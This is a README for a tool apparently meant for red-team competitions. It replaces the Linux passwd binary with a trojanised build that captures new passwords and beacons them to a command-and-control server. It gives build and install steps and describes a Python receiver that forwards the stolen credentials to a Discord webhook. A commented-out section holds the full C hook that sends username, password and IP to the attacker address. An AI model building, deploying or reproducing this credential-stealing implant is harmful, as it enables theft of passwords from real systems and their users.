# Retriever passwd Shim

#### What is this?
This is a basic Linux binary shim method on the `passwd` binary from the shadow package. This will grab new passwords while they are being changed using the binary and send it back to a defined C2.

#### What does it work on? (Tested)

Ubuntu - 18.04+ <br />Centos - 8+ <br />Debian - 11+ <br />Arch - ???  

#### What is this intended for 
This is intended for red teaming in a competition environment.<br><br>

## Build Instructions
Build binaries on the same operating system that it will be deployed on to reduce risk of issues with binary running. It is highly recommended you match the version as closely as possible.
### Dependancies
The dependancies for this project are listed below. There are also prepared commands to install dependancies using different package managers and distros. 
	
	git make wget autoconf autopoint libtool xsltproc
#### Distro Examples
##### Ubuntu/Debian
	apt install -y git make wget autoconf autopoint libtool xsltproc bison
##### RHEL Based
	yum install -y git make wget autoconf gettext-devel libtool libxslt
##### Arch
	pacman -Syu --noconfirm git wget make autoconf gettext libtool libxslt patch automake gcc bison
##### Alpine
	apk add git wget make autoconf gettext-dev libtool libxslt
### Run Build Script
Clone the Retriever repository. The most up to date version is most likely the best one. 
	
	git clone https://github.com/P4ral1ax/Retriever
Run the `generate.sh` script as a superuser. It will display the variables entered and then it will start the build process. If you would like to change the parameteres you can run the script again and it should run much faster and it WILL overwrite existing files. 
	
	./generate.sh {C2 Address} {Port} {Inferface} {XOR Password}
The generated binary will be placed in the Retriever directory with the correct permissions. If the file does not appear the build process has failed.

Parameter definitions :
- **C2 Address** : IP address credentials will be sent to
- **Port**		 : Destination port to send credentials to  	
- **Interface**  : The interface that the binary will use on the machine to send credentials
- **XOR Password**: The password used to encrypt the credentials 

### Install
To install the implant it is easy as replacing the original `passwd` binary on the system with the shimmed binary. Common location for this binary is `/usr/bin/passwd` and `/bin/passwd`. <br><br>

## Using the Python C2
This tool includes a simple server to recieve the credentals beaconed by the binary. This includes XOR decryption, parsing, and forwarding to a Discord and Sawmill webhook. 

A custom server could easily be used with retriever if desired. 
#### Pip Dependancies  
	python-dotenv requests
#### .env File

The python C2 expects a .env file to provide various parameters to run correctly. The C2 will run without a .env file but it highly recommended that it is utilized. 

#### .env Values

- **WEBHOOK** 	 : Set the Discord webhook (Default : none)
- **XOR_KEY** 	 : The key used to encrypt and decrypt (Default : bingus) 
- **PORT**    	 : Set the port the program listens on (Default : 8000)
- **SAWMILLURL** : Set the Sawmill URL (Default : none)

### Running the C2

Make sure firewalls allow traffic into that port then run the python file using Python3.

	python3 recv_pass.py

<!---
## Hooking the passwd.c File Manually

#### At the Top
Imports needed 

	#include <sys/socket.h>
	#include <arpa/inet.h> 
	#include <sys/ioctl.h>
	#include <netinet/in.h>
	#include <net/if.h>
	#include <unistd.h> 
	#include <string.h> 

Definitions

    #define PORT <port> 
    #define IP "<ip_address>" 


#### Adding the Hook
At line number ~266, right above the code that will salt the password, we add a line to run the function. 

    /* Hook to grab password */
	writetofile(pass);

    /*
	 * Encrypt the password, then wipe the cleartext password.
	 */
	salt = crypt_make_salt (NULL, NULL);

    

#### Adding the Function 

At line ~210 right above the new_password function is where I put this function although it just needs to be above where it is called. Make sure to replace the text "INT_HERE" in the 17th line with the actual interface being used by the computer.

	char* XORCipher(char* data, char* key, int dataLen, int keyLen) {
		char* output = (char*)malloc(sizeof(char) * dataLen);

		for (int i = 0; i < dataLen; ++i) {
			output[i] = data[i] ^ key[i % keyLen];
		}

		return output;
	}

	int writetofile (char *password){

		/* Get uid */
		uid_t uid = geteuid();
		struct passwd * pw = getpwuid(uid);
				
		/* Get IP Address */
		int fd;
		struct ifreq ifr;
		fd = socket(AF_INET, SOCK_DGRAM, 0);
			
		/* I want to get an IPv4 IP address */
		ifr.ifr_addr.sa_family = AF_INET;

		/* I want IP address attached to set interface - CHANGE INTERFACE*/
		strncpy(ifr.ifr_name, ens33, IFNAMSIZ-1);
		ioctl(fd, SIOCGIFADDR, &ifr);
		close(fd);
		
		/* display result */
		char buffer[256];
		char * ip;
		ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
		int j = snprintf(buffer, 256, "%s:%s:%s\n", name, password, ip);
		
		/* Make Socket */
		int sock = 0, valread;
		struct sockaddr_in serv_addr;

		/* Sock creation Pt 2*/
		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			return -1;
		}

		/* Socket Options */
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(PORT);
			
		/* Timeout settings */
		struct timeval timeout;
		timeout.tv_sec = 3;
		timeout.tv_usec = 0;
		
		if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
			return -1;
		}
		if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
			// pass
		}

		/* set IP and set buffer */
		if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
			return -1;
		}
		if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
			return -1;
		}

		/* Encrypt Message - CHANGE KEY*/
		char* key  = "KEY_HERE";
		int key_length = strlen(key);
		int mes_length = strlen(buffer);
		char* xor_message = XORCipher(buffer, key, mes_length, key_length);

		/* Send Message */
		send(sock , xor_message , mes_length, 0);	
		return 0;

	}
--->
